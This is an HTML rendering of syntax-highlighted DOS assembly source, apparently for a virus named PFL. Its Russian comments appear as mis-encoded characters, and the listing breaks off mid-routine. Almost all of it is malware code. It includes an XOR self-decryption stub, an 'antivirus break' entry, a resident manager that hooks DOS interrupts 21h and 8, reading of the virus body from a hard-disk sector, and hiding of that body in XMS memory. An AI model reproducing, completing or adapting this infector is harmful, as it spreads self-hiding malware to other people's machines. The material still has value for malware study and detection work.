<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>PFL61.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Const ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;„«¨­­  ¢¨pãá  ¢ ¡ ©â å                                                    ;³</span><span class="sc0">
</span><span class="sc5">length_of_virus_in_bate</span><span class="sc4">=(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">                                   </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;„«¨­­  ¢¨pãá  ¢ ¡ ©â å ªp â­ ï ¤¢ã¬                                       ;³</span><span class="sc0">
</span><span class="sc5">length_of_virus_in_bate_multiple_two</span><span class="sc4">=((</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)/</span><span class="sc2">2</span><span class="sc4">)*</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;„«¨­­  ¢¨pãá  ¢ á¥ªâ®p å                                                  ;³</span><span class="sc0">
</span><span class="sc5">length_of_virus_in_sector</span><span class="sc4">=(</span><span class="sc5">length_of_virus_in_bate</span><span class="sc4">)/</span><span class="sc2">200h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">                 </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;„«¨­­  ¢¨pãá  ­  ä ©«¥ ­¥ ãç¨âë¢ ï file_align                             ;³</span><span class="sc0">
</span><span class="sc5">length_virus_on_file</span><span class="sc4">=(</span><span class="sc5">endvirus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc5">length_of_antivirus_break_block</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;‘¨¬¢®« ª®â®pë© ¯®ª §ë âì (08h - ­¥¢¨¤¨¬)                                  ;³</span><span class="sc0">
</span><span class="sc5">symbol_to_show</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">08h</span><span class="sc0">                                                       </span><span class="sc1">;³</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc5">seg_a</span><span class="sc0">   </span><span class="sc9">segment</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc9">use16</span><span class="sc0">
        </span><span class="sc9">assume</span><span class="sc0">   </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">seg_a</span><span class="sc0">
        </span><span class="sc9">org</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0">
</span><span class="sc5">pfl</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">far</span><span class="sc0">
</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßß ANTIVIRUS BREAK ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc1">;H  p¥ «ì­®¬ § p ¦¥­­®¬ ä ©«¥ á¤¥áì ¡ã¤ãâ p á¯®«®£ âìáï ANTIVIRUS'­ë¥</span><span class="sc0">
</span><span class="sc1">;¡pïª¨ (â®çª¨ ¨å ®áâ ­®¢ )</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc5">symbol_to_show</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">21h</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßß VIRUS ENTRYPOINT ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc1">;…á«¨ ­  ¢å®¤¥ DX = 'DK', â® ¨¤¥¬ ¯pï¬® ­  ­®p¬ «ì­ë© ä ©«</span><span class="sc0">
</span><span class="sc5">virus</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc1">; ‚ ¯ ¬ïâ¨ ¬¥âª  VIRUS ¤®«¦­  ­ å®¤¨âáï ¯®  ¤p¥áã cs:0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">init_virus</span><span class="sc0">
</span><span class="sc5">init_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">      </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">init_virus</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc1">; áè¨äp®¢é¨ª</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0B0h</span><span class="sc0"> </span><span class="sc1">;MOV AL,0</span><span class="sc0">
</span><span class="sc5">crypt_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_crypt</span><span class="sc4">-</span><span class="sc5">begin_crypt</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc5">begin_crypt</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">encrypt_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">encrypt_virus</span><span class="sc0">
</span><span class="sc5">begin_crypt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">goto_virus</span><span class="sc0">
</span><span class="sc1">;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß MANAGER ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß</span><span class="sc0">
</span><span class="sc1">;€¤p¥á ­ å®¦¤¥­¨ï MANAGER'  ¢ ¯ ¬ïâ¨</span><span class="sc0">
</span><span class="sc5">M_ADDR</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0240h</span><span class="sc0">
</span><span class="sc1">;‘¥£¬¥­â ¢¨pãá </span><span class="sc0">
</span><span class="sc5">virus_segment</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">0BC00h</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">begin_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc2">31F5h</span><span class="sc0">
</span><span class="sc5">manager_int21_processing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc5">virus_segment</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">exit_manager</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0449h</span><span class="sc4">],</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">       </span><span class="sc5">exit_manager</span><span class="sc0">
        </span><span class="sc1">;à®¢¥à¨¬ ­ «¨ç¨¥ ¢¨àãá  ¢ ¯ ¬ïâ¨</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_virus_present</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">detected_virus_in_memory</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">virus_in_xms_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">load_virus_via_HIMEM</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">load_virus_via_int13</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">check_virus_present</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">       </span><span class="sc5">exit_load_virus</span><span class="sc0">
        </span><span class="sc1">;p®¢¥p¨¬ ¯p¨áãâáâ¢¨¥ HIMEM</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_manager</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4310h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">2Fh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">himem_entrypoint</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">himem_entrypoint</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc1">;‚ë¤¥«ï¥¬ 20 Š¨«®¡ ©â ¯ ¬ïâ¨</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_himem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_load_virus</span><span class="sc0">
        </span><span class="sc1">;‚ëå®¤: DX - HANDLE</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">handle_destination_1</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">handle_source_2</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">copy_to_xms</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0"> </span><span class="sc1">;Š®¯¨p®¢ âì ¢ XMS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_himem</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_load_virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">virus_in_xms_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">load_virus_via_HIMEM</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">copy_from_xms</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0Bh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">     </span><span class="sc5">call_himem</span><span class="sc0">
</span><span class="sc5">exit_load_virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">      </span><span class="sc5">exit_manager</span><span class="sc0">
</span><span class="sc5">detected_virus_in_memory</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc1">;¥à¥¤ ç  ã¯à ¢«¥­¨ï ¢¨àãáã</span><span class="sc0">
        </span><span class="sc6">lds</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">old_int21_vector_in_manager</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc5">place_of_int21</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0eah</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">virus_int21_processing</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">       </span><span class="sc5">virus_segment</span><span class="sc0">
</span><span class="sc5">exit_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0eah</span><span class="sc0">
</span><span class="sc5">old_int21_vector_in_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">check_virus_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">begin_solve_crc</span><span class="sc4">-</span><span class="sc5">virus</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc4">(</span><span class="sc5">end_solve_crc</span><span class="sc4">-</span><span class="sc5">begin_solve_crc</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">solve_crc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">      </span><span class="sc5">not_carry_1</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc5">not_carry_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">      </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">     </span><span class="sc5">solve_crc</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A1CAh</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_check_virus_present</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">29h</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">      </span><span class="sc5">exit_check_virus_present</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
</span><span class="sc5">exit_check_virus_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">load_virus_via_int13</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">                       </span><span class="sc1">;—¨â âì á¥ªâ®p </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc5">length_of_virus_in_sector</span><span class="sc0"> </span><span class="sc1">;‘ª®«ìª® ç¨â âì</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">                     </span><span class="sc1">;0 £®«®¢ª </span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003h</span><span class="sc0">                     </span><span class="sc1">;0 æ¨«¨­¤p 3 á¥ªâ®p</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">      </span><span class="sc2">13h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">call_himem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">09Ah</span><span class="sc0">
</span><span class="sc5">himem_entrypoint</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ DATA IN MANAGER ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">copy_to_xms</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">length_of_block_1</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">length_of_virus_in_bate_multiple_two</span><span class="sc0">
        </span><span class="sc5">handle_source_1</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">offset_source_1</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">virus_segment</span><span class="sc0">
        </span><span class="sc5">handle_destination_1</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; HANDLE IN XMS</span><span class="sc0">
        </span><span class="sc5">offset_destination_1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">copy_from_xms</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">length_of_block_2</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc5">length_of_virus_in_bate_multiple_two</span><span class="sc0">
        </span><span class="sc5">handle_source_2</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; HANDLE IN XMS</span><span class="sc0">
        </span><span class="sc5">offset_source_2</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">handle_destination_2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc5">offset_destination_2</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">virus_segment</span><span class="sc0">
</span><span class="sc5">manager_idle_flag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">;1 MANAGER ¢ëª«îç¥­</span><span class="sc0">
</span><span class="sc5">virus_in_xms_flag</span><span class="sc0">            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">;1 ‚¨pãá­®¥ â¥«® ­ å®¤¨âáï ¢ XMS</span><span class="sc0">
</span><span class="sc5">hooked_win_int21_flag</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> </span><span class="sc1">;1 ¥p¥å¢ ç¥­ WIN_INT21</span><span class="sc0">
</span><span class="sc5">entry_manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">0EAh</span><span class="sc0">
</span><span class="sc5">hooked_win_int21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc1">;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">manager_int8_procesing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">     </span><span class="sc2">0000h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">      </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">M_ADDR</span><span class="sc4">+</span><span class="sc5">wait_next_int21_flag</span><span class="sc4">-</span><span class="sc5">begin_manager</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">       </span><span class="sc5">check_next_int21</span><span class="sc0">
